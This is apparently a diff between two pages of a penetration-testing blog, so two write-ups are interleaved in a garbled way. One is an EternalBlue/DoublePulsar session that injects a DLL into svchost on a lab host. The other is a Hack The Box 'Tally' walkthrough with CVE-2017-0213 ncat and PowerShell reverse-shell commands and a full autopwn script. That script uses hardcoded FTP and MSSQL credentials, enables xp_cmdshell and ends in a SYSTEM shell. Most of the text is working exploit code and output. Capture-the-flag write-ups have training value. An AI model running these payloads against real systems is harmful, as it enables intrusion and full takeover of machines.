-[*]  MaxExploitAttempts :: Number of times to attempt the exploit and groom. Disabled for XP/2K3.
-[?] MaxExploitAttempts [3] : 
-[*]  GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetup allocations (XK/2K3) to do.
-[?] GroomAllocations [12] : 
-[*]  Target :: Operating System, Service Pack, and Architecture of target OS
+C:\Users\Sarah\Desktop&gt; whoami
+nt authority\system :D</code></pre></div></div>
 
-*-&gt; 0) XP            Windows XP 32-Bit All Service Packs
-    1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs
+<h2 id="using-cve-2017-213">Using CVE-2017-213</h2>
 
-[?] Target [1] : 0
-[+] Set Target =&gt; XP
+<p>We can also use CVE-2017-213 for privilege escalation:</p>
 
-[!] Preparing to Execute Eternalblue
+<ol>
+<li><p><a href="https://github.com/WindowsExploits/Exploits/blob/master/CVE-2017-0213/Source/CVE-2017-0213.cpp" target="_blank">https://github.com/WindowsExploits/Exploits/blob/master/CVE-2017-0213/Source/CVE-2017-0213.cpp</a></p></li>
 
-[*]  Mode :: Delivery mechanism
+<li><p>Change the cmdline in CVE-2017-0213.cpp to run ncat or a powershell script to get a remote shell. E.g.:
+<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">WCHAR</span> <span class="n">cmdline</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">Sarah</span><span class="se">\\</span><span class="s">Desktop</span><span class="se">\\</span><span class="s">ncat.exe 10.10.14.190 60002 -e cmd.exe&#34;</span>
+</code></pre></div>
+or
+<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">WCHAR</span> <span class="n">cmdline</span><span class="p">[]</span> <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;powershell -ExecutionPolicy bypass -NoExit -File C:</span><span class="se">\\</span><span class="s">FTP</span><span class="se">\\</span><span class="s">Intranet</span><span class="se">\\</span><span class="s">shell.ps1&#34;</span><span class="p">;</span>
+</code></pre></div></p></li>
 
-    0) DANE     Forward deployment via DARINGNEOPHYTE
-*-&gt; 1) FB       Traditional deployment from within FUZZBUNCH
+<li><p>Compile it, upload it and copy it in a folder where user has write permissions.</p></li>
 
-[?] Mode [0] : 1
-[+] Run Mode: FB
+<li><p>Migrate your existing shell to another process (Important! Otherwise it doesn&rsquo;t work.)</p></li>
 
-[?] This will execute locally like traditional Fuzzbunch plugins. Are you sure? (y/n) [Yes] : y
-[*] Redirection OFF
+<li><p>Set up the listener on your side.</p></li>
 
-[+] Configure Plugin Local Tunnels
-[+] Local Tunnel - local-tunnel-1
-[?] Destination IP [10.10.10.4] : 
-[?] Destination Port [445] : 
-[+] (TCP) Local 10.10.10.4:445
+<li><p>Execute CVE-2017-213.exe</p></li>
+</ol>
 
-[+] Configure Plugin Remote Tunnels</code></pre></div></div>
+<p>You can download my autopwn script (and the other required files) from here:
+<a href="https://github.com/Alamot/code-snippets/tree/master/hacking/HTB/Tally" target="_blank">https://github.com/Alamot/code-snippets/tree/master/hacking/HTB/Tally</a></p>
 
-<p>These are our final settings for EternalBlue:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">Module: Eternalblue
-===================
+<p>(Don&rsquo;t forget to set LHOST appropriately. If you are using a Linux OS, the script tries to automatically get the LHOST IP from the tun0 interface).
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
+<span class="c1"># Author: Alamot</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">uuid</span>
+<span class="kn">import</span> <span class="nn">fcntl</span>
+<span class="kn">import</span> <span class="nn">_mssql</span>
+<span class="kn">import</span> <span class="nn">signal</span>
+<span class="kn">import</span> <span class="nn">ftplib</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
+<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_DFL</span><span class="p">)</span>
 
-Name                  Value                                                 
-----                  -----                                                 
-DaveProxyPort         0                                                     
-NetworkTimeout        60                                                    
-TargetIp              10.10.10.4                                            
-TargetPort            445                                                   
-VerifyTarget          True                                                  
-VerifyBackdoor        True                                                  
-MaxExploitAttempts    3                                                     
-GroomAllocations      12                                                    
-ShellcodeBuffer                                                             
-Target                XP</code></pre></div></div></p>
 
-<p>Now let&rsquo;s execute it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[?] Execute Plugin? [Yes] : y    
-[*] Executing Plugin
-[*] Connecting to target for exploitation.
-    [+] Connection established for exploitation.
-[*] Pinging backdoor...
-    [+] Backdoor not installed, game on.
-[*] Forcing MaxExploitAttempts to 1.
-[*] Target OS selected valid for OS indicated by SMB reply
-[*] CORE raw buffer dump (12 bytes):
-0x00000000  57 69 6e 64 6f 77 73 20 35 2e 31 00              Windows 5.1.
-[*] Fingerprinting SMB non-paged pool quota
-    [+] Allocation total: 0xfff4
-    [+] Spray size: 0
-    [+] Allocation total: 0x1ffe8
-    [+] Spray size: 1
-    [+] Allocation total: 0x2ffdc
-    [+] Spray size: 2
-    [+] Allocation total: 0x3ffd0
-    [+] Spray size: 3
-    [+] Allocation total: 0x4ffc4
-    [+] Spray size: 4
-    [+] Allocation total: 0x5ffb8
-    [+] Spray size: 5
-    [+] Allocation total: 0x6ffac
-    [+] Spray size: 6
-    [+] Allocation total: 0x7ffa0
-    [+] Spray size: 7
-    [+] Allocation total: 0x8ff94
-    [+] Spray size: 8
-    [+] Allocation total: 0x9ff88
-    [+] Spray size: 9
-    [+] Allocation total: 0xaff7c
-    [+] Spray size: 10
-    [+] Allocation total: 0xbff70
-    [+] Spray size: 11
-    [+] Quota NOT exceeded after 12 packets
-    [+] Allocation total: 0xbff70
-[*] Building exploit buffer
-[*] Sending all but last fragment of exploit packet
-    ................DONE.
-[*] Sending SMB Echo request
-[*] Good reply from SMB Echo request
-[*] Starting non-paged pool grooming
-    [+] Sending 2 non-paged pool fragment packets
-        ....DONE.
-    [+] Sent 2 non-paged pool fragment packets ofsize 0x00006FF9
-    [+] Sending 10 non-paged pool grooming packets
-        ..........DONE.
-    [+] Sent 10 non-paged pool grooming packets - groom complete
-[*] Sending SMB Echo request
-[*] Good reply from SMB Echo request
-[*] Sending last fragment of exploit packet!
-    DONE.
-[*] Receiving response from exploit packet
-    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
-[*] Triggering free of corrupted buffer.
-[*] Pinging backdoor...
-    [+] Backdoor returned code: 10 - Success!
-    [+] Ping returned Target architecture: x86 (32-bit)
-    [+] Backdoor installed
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[*] CORE sent serialized output blob (2 bytes):
-0x00000000  08 00                                            ..
-[*] Received output parameters from CORE
-[+] CORE terminated with status code 0x00000000
-[+] Eternalblue Succeeded</code></pre></div></div></p>
+<span class="k">def</span> <span class="nf">get_ip_address</span><span class="p">(</span><span class="n">ifname</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">fcntl</span><span class="o">.</span><span class="n">ioctl</span><span class="p">(</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span>
+        <span class="mh">0x8915</span><span class="p">,</span>  <span class="c1"># SIOCGIFADDR</span>
+        <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;256s&#39;</span><span class="p">,</span> <span class="n">ifname</span><span class="p">[:</span><span class="mi">15</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="p">)[</span><span class="mi">20</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
 
-<h3 id="executing-doublepulsar">Executing DoublePulsar</h3>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">fb Special (Eternalblue) &gt; use DoublePulsar
+<span class="c1">#LHOST = &#34;10.10.15.247&#34;</span>
+<span class="n">LHOST</span> <span class="o">=</span> <span class="n">get_ip_address</span><span class="p">(</span><span class="s1">&#39;tun0&#39;</span><span class="p">)</span>
+<span class="n">LPORT1</span><span class="o">=</span><span class="s2">&#34;60000&#34;</span>
+<span class="n">LPORT2</span><span class="o">=</span><span class="s2">&#34;60001&#34;</span>
+<span class="n">LPORT3</span><span class="o">=</span><span class="s2">&#34;60002&#34;</span>
+<span class="n">FTP_SERVER</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.59&#34;</span>
+<span class="n">FTP_USERNAME</span> <span class="o">=</span> <span class="s2">&#34;ftp_user&#34;</span>
+<span class="n">FTP_PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;UTDRSCH53c</span><span class="se">\&#34;</span><span class="s2">$6hys&#34;</span>
+<span class="n">FTP_UPLOADPATH</span> <span class="o">=</span> <span class="s2">&#34;Intranet&#34;</span>
+<span class="n">MSSQL_SERVER</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.59:1433&#34;</span>
+<span class="n">MSSQL_USERNAME</span> <span class="o">=</span> <span class="s2">&#34;sa&#34;</span>
+<span class="n">MSSQL_PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;GWE3V65#6KFH93@4GWTG2G&#34;</span>
+<span class="n">TIMEOUT</span> <span class="o">=</span> <span class="mi">60</span>
 
-[!] Entering Plugin Context :: Doublepulsar
-[*] Applying Global Variables
-[+] Set NetworkTimeout =&gt; 60
-[+] Set TargetIp =&gt; 10.10.10.4
 
-[*] Applying Session Parameters
+<span class="k">def</span> <span class="nf">get_ps_payload</span><span class="p">(</span><span class="n">lost</span><span class="p">,</span> <span class="n">lport</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s2">&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&#34;</span><span class="o">+</span><span class="n">lost</span><span class="o">+</span><span class="s2">&#34;&#39;,&#34;</span><span class="o">+</span><span class="n">lport</span><span class="o">+</span><span class="s2">&#34;); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &#39;PS &#39; + (pwd).Path; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();&#34;</span>
 
-[!] Enter Prompt Mode :: Doublepulsar
+<span class="n">payload1</span> <span class="o">=</span> <span class="n">get_ps_payload</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT1</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="n">get_ps_payload</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT2</span><span class="p">)</span>
+<span class="n">payload3</span> <span class="o">=</span> <span class="n">get_ps_payload</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT3</span><span class="p">)</span>
 
-Module: Doublepulsar
-====================
+<span class="k">def</span> <span class="nf">initiate</span><span class="p">():</span>
+    <span class="n">unique_filename1</span> <span class="o">=</span> <span class="s2">&#34;msf1.ps1&#34;</span>
+    <span class="n">unique_filename2</span> <span class="o">=</span> <span class="s2">&#34;msf2.ps1&#34;</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename1</span><span class="p">,</span><span class="s1">&#39;wt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename2</span><span class="p">,</span><span class="s1">&#39;wt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
+        
+    <span class="n">ftp</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">ftp</span> <span class="o">=</span> <span class="n">ftplib</span><span class="o">.</span><span class="n">FTP</span><span class="p">(</span><span class="n">FTP_SERVER</span><span class="p">,</span><span class="n">FTP_USERNAME</span><span class="p">,</span><span class="n">FTP_PASSWORD</span><span class="p">)</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Successful login at ftp server &#34;</span><span class="o">+</span><span class="n">FTP_SERVER</span><span class="o">+</span><span class="s2">&#34; with username &#39;&#34;</span><span class="o">+</span><span class="n">FTP_USERNAME</span><span class="o">+</span><span class="s2">&#34;&#39; and password &#39;&#34;</span><span class="o">+</span><span class="n">FTP_PASSWORD</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Changing current working directory to &#34;</span> <span class="o">+</span> <span class="n">FTP_UPLOADPATH</span><span class="p">)</span>
+        <span class="n">ftp</span><span class="o">.</span><span class="n">cwd</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="p">)</span>
+        
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading &#34;</span><span class="o">+</span><span class="n">unique_filename1</span><span class="p">)</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename1</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
+            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s1">&#39;STOR &#39;</span><span class="o">+</span><span class="n">unique_filename1</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
 
-Name              Value                                                 
-----              -----                                                 
-NetworkTimeout    60                                                    
-TargetIp          10.10.10.4                                            
-TargetPort        445                                                   
-OutputFile                                                              
-Protocol          SMB                                                   
-Architecture      x86                                                   
-Function          OutputInstall                                         
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading Invoke-PSInject.ps1&#34;</span><span class="p">)</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;Invoke-PSInject.ps1&#34;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
+            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s2">&#34;STOR Invoke-PSInject.ps1&#34;</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+            
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading &#34;</span><span class="o">+</span><span class="n">unique_filename2</span><span class="p">)</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename2</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
+            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s1">&#39;STOR &#39;</span><span class="o">+</span><span class="n">unique_filename2</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+            
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading cve2017213ps.exe&#34;</span><span class="p">)</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;cve2017213ps.exe&#34;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
+            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s2">&#34;STOR cve2017213ps.exe&#34;</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
 
-[!] Plugin Variables are NOT Valid
-[?] Prompt For Variable Settings? [Yes] : 
-[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.
-[?] NetworkTimeout [60] : 
-[*]  TargetIp :: Target IP Address
-[?] TargetIp [10.10.10.4] : 
-[*]  TargetPort :: Port used by the Double Pulsar back door
-[?] TargetPort [445] : 
-[*]  Protocol :: Protocol for the backdoor to speak
+            
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;FTP failed: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">ftp</span><span class="p">:</span>
+            <span class="n">ftp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
 
-*-&gt; 0) SMB     Ring 0 SMB (TCP 445) backdoor
-    1) RDP     Ring 0 RDP (TCP 3389) backdoor
 
-[?] Protocol [0] : 
-[*]  Architecture :: Architecture of the target OS
+    <span class="n">mssql</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">mssql</span> <span class="o">=</span> <span class="n">_mssql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server</span><span class="o">=</span><span class="n">MSSQL_SERVER</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">MSSQL_USERNAME</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">MSSQL_PASSWORD</span><span class="p">)</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Successful login at mssql server &#34;</span><span class="o">+</span><span class="n">MSSQL_SERVER</span><span class="o">+</span><span class="s2">&#34; with username &#39;&#34;</span><span class="o">+</span><span class="n">MSSQL_USERNAME</span><span class="o">+</span><span class="s2">&#34;&#39; and password &#39;&#34;</span><span class="o">+</span><span class="n">MSSQL_PASSWORD</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Enabling &#39;xp_cmdshell&#39;&#34;</span><span class="p">)</span>
+        <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec SP_CONFIGURE &#39;xp_cmdshell&#39;, 1;RECONFIGURE -- &#34;</span><span class="p">)</span>
+        <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC master..xp_cmdshell &#39;powershell -ExecutionPolicy bypass -NoExit -File C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">unique_filename1</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;MSSQL failed: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">mssql</span><span class="p">:</span>
+            <span class="n">mssql</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
-*-&gt; 0) x86     x86 32-bits
-    1) x64     x64 64-bits
 
-[?] Architecture [0] : 
-[*]  Function :: Operation for backdoor to perform
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LHOST = &#34;</span><span class="o">+</span><span class="n">LHOST</span><span class="p">)</span>
 
-    0) OutputInstall     Only output the install shellcode to a binary file on disk.
-    1) Ping              Test for presence of backdoor
-*-&gt; 2) RunDLL            Use an APC to inject a DLL into a user mode process.
-    3) RunShellcode      Run raw shellcode
-    4) Uninstall         Remove&#39;s backdoor from system
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">initiate</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+    
+<span class="n">ps1</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">ps1</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+<span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cd C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;. .</span><span class="se">\\</span><span class="s2">Invoke-PSInject.ps1&#34;</span><span class="p">)</span>
+<span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;Invoke-PSInject -ProcName sihost -PoshCode &#34;</span><span class="o">+</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload2</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;UTF-16LE&#39;</span><span class="p">)))</span>
 
-[?] Function [0] : 2
-[+] Set Function =&gt; RunDLL
-[*]  DllPayload :: DLL to inject into user mode
-[?] DllPayload [] : 
-[*]  DllPayload :: DLL to inject into user mode
-[?] DllPayload [] : C:\shell.dll
-[+] Set DllPayload =&gt; C:\shell.dll
-[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to call
-[?] DllOrdinal [1] : 
-[*]  ProcessName :: Name of process to inject into
-[?] ProcessName [lsass.exe] : svchost.exe    
-[+] Set ProcessName =&gt; svchost.exe
-[*]  ProcessCommandLine :: Command line of process to inject into
-[?] ProcessCommandLine [] : 
+<span class="n">ps2</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">ps2</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+<span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;copy C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">cve2017213ps.exe C:</span><span class="se">\\</span><span class="s2">TEMP</span><span class="se">\\</span><span class="s2">cve2017213ps.exe&#34;</span><span class="p">)</span>
+<span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cd C:</span><span class="se">\\</span><span class="s2">TEMP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;. .</span><span class="se">\\</span><span class="s2">cve2017213ps.exe&#34;</span><span class="p">)</span>
 
-[!] Preparing to Execute Doublepulsar
-[*] Redirection OFF
-[+] Configure Plugin Local Tunnels
-[+] Local Tunnel - local-tunnel-1
-[?] Destination IP [10.10.10.4] : 
-[?] Destination Port [445] : 
-[+] (TCP) Local 10.10.10.4:445
+<span class="n">ps3</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT3</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">ps3</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+<span class="n">ps3</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
-[+] Configure Plugin Remote Tunnels</code></pre></div></div>
+<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span></code></pre></div></p>
 
-<p>These are our final settings for DoublePulsar:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">Module: Doublepulsar
-====================
+<p>Here is the output:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[*] LHOST = 10.10.15.247
+[+] Trying to bind to 0.0.0.0 on port 60000: Done
+[+] Waiting for connections on 0.0.0.0:60000: Got connection from 10.10.10.59 on port 50143
+[+] Successful login at ftp server 10.10.10.59 with username &#39;ftp_user&#39; and password &#39;UTDRSCH53c&#34;$6hys&#39;
+[*] Changing current working directory to Intranet
+[*] Uploading msf1.ps1
+[*] Uploading Invoke-PSInject.ps1
+[*] Uploading msf2.ps1
+[*] Uploading cve2017213ps.exe
+[+] Successful login at mssql server 10.10.10.59:1433 with username &#39;sa&#39; and password &#39;GWE3V65#6KFH93@4GWTG2G&#39;
+[*] Enabling &#39;xp_cmdshell&#39;
+[+] Trying to bind to 0.0.0.0 on port 60001: Done
+[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.59 on port 50154
+[+] Trying to bind to 0.0.0.0 on port 60002: Done
+[+] Waiting for connections on 0.0.0.0:60002: Got connection from 10.10.10.59 on port 50161
+[*] Switching to interactive mode
+$ whoami
+nt authority\system
+PS C:\Windows\system32$</code></pre></div></div></p>
 
-Name                  Value                                                 
-----                  -----                                                 
-NetworkTimeout        60                                                    
-TargetIp              10.10.10.4                                            
-TargetPort            445                                                   
-DllPayload            C:\shell.dll                                          
-DllOrdinal            1                                                     
-ProcessName           svchost.exe                                           
-ProcessCommandLine                                                          
-Protocol              SMB                                                   
-Architecture          x86                                                   
-Function              RunDLL</code></pre></div></div></p>
+<h1 id="what-about-exploiting-firefox">What about exploiting Firefox</h1>
 
-<p><strong>It&rsquo;s important to change the ProcessName from lsass.exe to svchost.exe !!!</strong>  Now, let&rsquo;s execute it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[?] Execute Plugin? [Yes] : 
-[*] Executing Plugin
-[+] Selected Protocol SMB
-[.] Connecting to target...
-[+] Connected to target, pinging backdoor...
-    [+] Backdoor returned code: 10 - Success!
-    [+] Ping returned Target architecture: x86 (32-bit) - XOR Key: 0x00811F87
-    SMB Connection string is: Windows 5.1
-    Target OS is: XP x86
-    [+] Backdoor installed
-    [+] DLL built
-    [.] Sending shellcode to inject DLL
-    [+] Backdoor returned code: 10 - Success!
-    [+] Backdoor returned code: 10 - Success!
